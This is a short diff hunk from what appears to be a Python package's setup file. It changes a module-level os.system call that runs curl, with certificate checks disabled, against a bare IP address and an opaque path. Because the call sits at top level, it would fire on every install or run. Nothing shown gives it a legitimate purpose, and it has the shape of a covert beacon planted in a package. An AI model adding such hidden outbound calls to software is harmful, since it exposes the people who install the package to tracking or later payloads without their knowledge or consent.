@@ -14,7 +14,7 @@ import json
 
 
 
-os.system("curl -k -vv https://47.242.44.227/fortest0925")
+os.system("curl -k -vv https://47.242.44.226/fortest0925")
 
 
 # HISTORY.rst entry.
